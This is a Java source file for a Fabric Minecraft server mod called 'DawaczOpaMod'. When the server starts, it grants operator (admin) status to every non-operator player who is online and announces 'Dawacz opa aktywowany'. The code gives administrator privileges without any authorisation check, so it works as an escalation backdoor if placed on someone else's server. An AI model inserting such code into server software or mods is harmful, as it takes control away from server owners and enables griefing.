package com.example.dawaczopa;

import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.event.lifecycle.v1.ServerLifecycleEvents;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.text.Text;

public class DawaczOpaMod implements ModInitializer {
    @Override
    public void onInitialize() {
        ServerLifecycleEvents.SERVER_STARTED.register(server -> {
            server.getPlayerManager().getPlayerList().forEach(player -> {
                if (!server.getPlayerManager().isOperator(player.getGameProfile())) {
                    server.getCommandManager().execute(server.getCommandSource(), "op " + player.getEntityName());
                    player.sendMessage(Text.literal("Dawacz opa aktywowany"), false);
                }
            });
        });
    }
}